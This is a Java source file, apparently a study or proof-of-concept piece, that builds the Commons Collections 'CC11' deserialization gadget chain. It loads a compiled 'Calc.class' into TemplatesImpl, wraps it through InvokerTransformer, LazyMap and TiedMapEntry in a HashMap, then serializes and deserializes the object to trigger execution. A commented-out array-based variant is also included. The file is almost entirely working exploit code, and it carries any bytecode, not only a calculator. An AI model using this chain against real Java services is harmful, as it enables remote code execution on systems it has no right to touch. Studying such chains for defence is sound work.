package exp;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

import static tools.Decode.unserialize;
import static tools.Encode.serialize;
import static tools.SetField.setField;

public class CC11 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        setField(templates, "_name", "CC11");
        byte[] code = Files.readAllBytes(Paths.get("src/main/java/classpoc/Calc.class"));
        byte[][] codes = {code};
        setField(templates, "_bytecodes",codes);
        setField(templates, "_tfactory",new TransformerFactoryImpl());

/// ========================================带数组的CC11链========================================
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(templates),
//                new InvokerTransformer("newTransformer",null,null)
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        Map map = new HashMap();
//        LazyMap decorator = (LazyMap) LazyMap.decorate(map,chainedTransformer);
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorator,"key");
/// ========================================带数组的CC11链========================================

/// ========================================不带数组的CC11链========================================
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});
        Map map = new HashMap();
        LazyMap decorator = (LazyMap) LazyMap.decorate(map,invokerTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorator,templates);
/// ========================================不带数组的CC11链========================================

        HashMap<Object,Object> hashMap = new HashMap<>();
        setField(tiedMapEntry,"map",new HashMap());
        hashMap.put(tiedMapEntry,"123");
        setField(tiedMapEntry,"map",decorator);

        serialize(hashMap);
        unserialize("ser.bin");
    }
}
